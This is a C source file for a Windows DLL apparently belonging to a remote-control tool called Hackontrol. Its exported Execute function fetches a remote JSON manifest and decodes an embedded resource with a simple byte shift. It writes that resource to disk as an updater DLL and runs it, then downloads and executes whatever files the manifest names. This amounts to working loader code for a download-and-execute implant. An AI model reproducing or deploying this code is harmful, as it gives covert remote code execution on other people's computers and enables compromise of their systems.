#include <libkhopancurl.h>
#include <libhackontrol.h>
#include <openssl/sha.h>
#include "Execute.h"
#include "resource.h"

//#define HACKONTROL_OVERRIDE

#ifndef HACKONTROL_OVERRIDE
#ifdef _DEBUG
#define HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
#define HACKONTROL_NO_SELF_UPDATE
//#define HACKONTROL_NO_DOWNLOAD_FILE
//#define HACKONTROL_NO_EXECUTE_FILE
#endif
#endif

static HINSTANCE instance;

BOOL WINAPI DllMain(HINSTANCE application, DWORD reason, LPVOID reserved) {
	instance = application;
	return TRUE;
}

static BOOL selfUpdate(const cJSON* const root, const LPCWSTR folderHackontrol) {
	cJSON* selfField = cJSON_GetObjectItem(root, "self");

	if(!selfField || !cJSON_IsObject(selfField)) {
		return FALSE;
	}

	cJSON* urlField = cJSON_GetObjectItem(selfField, "url");

	if(!urlField || !cJSON_IsString(urlField)) {
		return FALSE;
	}

	LPSTR url = cJSON_GetStringValue(urlField);

	if(!url) {
		return FALSE;
	}

	LPWSTR fileLibdll32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBDLL32, folderHackontrol);

	if(!fileLibdll32) {
		return FALSE;
	}

	BOOL result = ExecuteHashFileCheck(selfField, fileLibdll32);
	LocalFree(fileLibdll32);

	if(result) {
		return TRUE;
	}

	HRSRC handle = FindResourceW(instance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!handle) {
		return FALSE;
	}

	DWORD size = SizeofResource(instance, handle);

	if(!size) {
		return FALSE;
	}

	HGLOBAL resource = LoadResource(instance, handle);

	if(!resource) {
		return FALSE;
	}

	PBYTE data = LockResource(resource);

	if(!data) {
		return FALSE;
	}

	PBYTE buffer = LocalAlloc(LMEM_FIXED, size);

	if(!buffer) {
		return FALSE;
	}

	for(DWORD i = 0; i < size; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR fileLibupdate32 = KHOPANFormatMessage(L"%ws\\" FILE_LIBUPDATE32, folderHackontrol);

	if(!fileLibupdate32) {
		LocalFree(buffer);
		return FALSE;
	}

	result = HackontrolWriteFile(fileLibupdate32, buffer, size);
	LocalFree(buffer);

	if(!result) {
		LocalFree(fileLibupdate32);
		return FALSE;
	}

	LPSTR argumentLibupdate32 = KHOPANFormatANSI("%lu %s", GetCurrentProcessId(), url);

	if(!argumentLibupdate32) {
		LocalFree(fileLibupdate32);
		return FALSE;
	}

	KHOPANExecuteDynamicLibrary(fileLibupdate32, FUNCTION_LIBUPDATE32, argumentLibupdate32);
	LocalFree(argumentLibupdate32);
	LocalFree(fileLibupdate32);
	return TRUE;
}

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	DWORD processIdentifier = 0;
	BOOL update = TRUE;
	PBYTE buffer;

	if(!argument || !strlen(argument)) {
		goto initializeGlobal;
	}

	buffer = (PBYTE) KHOPANFormatMessage(L"%S", argument);

	if(!buffer) {
		goto initializeGlobal;
	}

	int count;
	LPWSTR* arguments = CommandLineToArgvW((LPCWSTR) buffer, &count);
	LocalFree(buffer);

	if(!arguments) {
		goto initializeGlobal;
	}

	if(count > 0) {
		processIdentifier = (DWORD) _wtoll(arguments[0]);
	}

	update = count > 1 && _wtoll(arguments[1]) ? FALSE : TRUE;
	LocalFree(arguments);
initializeGlobal:
	CURLcode code = curl_global_init(CURL_GLOBAL_ALL);

	if(code != CURLE_OK) {
		KHOPANERRORMESSAGE_CURL(code, L"curl_global_init");
		return;
	}

	cJSON* root = NULL;
	HANDLE handle;
#ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
	handle = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(handle == INVALID_HANDLE_VALUE) {
		KHOPANLASTERRORMESSAGE_WIN32(L"CreateFileW");
		goto cleanupGlobal;
	}

	LARGE_INTEGER integer;

	if(!GetFileSizeEx(handle, &integer)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"GetFileSizeEx");
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	buffer = LocalAlloc(LMEM_FIXED, integer.LowPart + 1);

	if(!buffer) {
		KHOPANLASTERRORMESSAGE_WIN32(L"LocalAlloc");
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	DWORD bytesRead;

	if(!ReadFile(handle, buffer, integer.LowPart, &bytesRead, NULL)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"ReadFile");
		LocalFree(buffer);
		CloseHandle(handle);
		goto cleanupGlobal;
	}

	buffer[integer.LowPart] = 0;
	root = cJSON_Parse(buffer);
	LocalFree(buffer);
	CloseHandle(handle);
#else
	DATASTREAM stream = {0};
	code = HackontrolDownload(URL_LATEST_FILE, &stream, TRUE, TRUE);

	if(code != CURLE_OK) {
		KHOPANERRORMESSAGE_CURL(code, L"HackontrolDownload");
		goto cleanupGlobal;
	}

	if(!KHOPANStreamAdd(&stream, "", 1)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"KHOPANStreamAdd");
		goto cleanupGlobal;
	}

	root = cJSON_Parse(stream.data);
	KHOPANStreamFree(&stream);
#endif
	if(!root) {
		MessageBoxW(NULL, L"Unable to parse JSON document", L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		goto cleanupGlobal;
	}

	if(!cJSON_IsObject(root)) {
		KHOPANERRORMESSAGE_WIN32(ERROR_BAD_FORMAT, L"cJSON_IsObject");
		goto deleteJson;
	}

	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();

	if(!folderHackontrol) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolGetHomeDirectory");
		goto deleteJson;
	}

	if(!HackontrolCreateDirectory(folderHackontrol)) {
		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolCreateDirectory");
		goto freeFolderHackontrol;
	}
#ifndef HACKONTROL_NO_SELF_UPDATE
	if(update && selfUpdate(root, folderHackontrol)) {
		goto freeFolderHackontrol;
	}
#endif
	if(processIdentifier && (handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processIdentifier))) {
		WaitForSingleObject(handle, INFINITE);
		CloseHandle(handle);
	}
#ifndef HACKONTROL_NO_DOWNLOAD_FILE
	if(update) {
		ExecuteDownload(root, folderHackontrol);
	}
#endif
#ifndef HACKONTROL_NO_EXECUTE_FILE
	ExecuteExecute(root, folderHackontrol);
#endif
freeFolderHackontrol:
	LocalFree(folderHackontrol);
deleteJson:
	cJSON_Delete(root);
cleanupGlobal:
	curl_global_cleanup();
}

LPWSTR ExecuteGetFile(const cJSON* const root, const LPCWSTR folderHackontrol) {
	cJSON* fileField = cJSON_GetObjectItem(root, "file");

	if(!fileField || !cJSON_IsString(fileField)) {
		return NULL;
	}

	LPSTR file = cJSON_GetStringValue(fileField);

	if(!file) {
		return NULL;
	}

	BOOL absolute = FALSE;
	cJSON* field = cJSON_GetObjectItem(root, "relative");

	if(field && cJSON_IsBool(field)) {
		absolute = cJSON_IsFalse(field);
	}

	field = cJSON_GetObjectItem(root, "absolute");

	if(field && cJSON_IsBool(field)) {
		absolute = cJSON_IsTrue(field);
	}

	if(absolute) {
		return KHOPANFormatMessage(L"%S", file);
	}

	return KHOPANFormatMessage(L"%ws\\%S", folderHackontrol, file);
}

BOOL ExecuteHashFileCheck(const cJSON* const root, const LPCWSTR file) {
	HANDLE handle = CreateFileW(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if(handle == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	LARGE_INTEGER integer;
	BOOL returnValue = FALSE;

	if(!GetFileSizeEx(handle, &integer)) {
		goto closeHandle;
	}

	PBYTE buffer = LocalAlloc(LMEM_FIXED, integer.LowPart);

	if(!buffer) {
		goto closeHandle;
	}

	DWORD bytesRead;

	if(!ReadFile(handle, buffer, integer.LowPart, &bytesRead, NULL)) {
		goto freeBuffer;
	}

	LPCSTR hexadecimal = "0123456789abcdef";
	UINT index;
	cJSON* field;
#define DEFINE_HASH(x, y, z) field=cJSON_GetObjectItem(root,x);if(field&&cJSON_IsString(field)){BYTE hash[z];y(buffer,integer.LowPart,hash);CHAR output[z*2+1];for(index=0;index<z;index++){output[index*2]=hexadecimal[(hash[index]>>4)&0x0F];output[index*2+1]=hexadecimal[hash[index]&0x0F];}output[z*2]=0;returnValue=!strcmp(output,cJSON_GetStringValue(field));goto freeBuffer;}
	DEFINE_HASH("sha512", SHA512, SHA512_DIGEST_LENGTH);
	DEFINE_HASH("sha384", SHA384, SHA384_DIGEST_LENGTH);
	DEFINE_HASH("sha256", SHA256, SHA256_DIGEST_LENGTH);
	DEFINE_HASH("sha224", SHA224, SHA224_DIGEST_LENGTH);
	DEFINE_HASH("sha1", SHA1, SHA_DIGEST_LENGTH);
freeBuffer:
	LocalFree(buffer);
closeHandle:
	CloseHandle(handle);
	return returnValue;
}
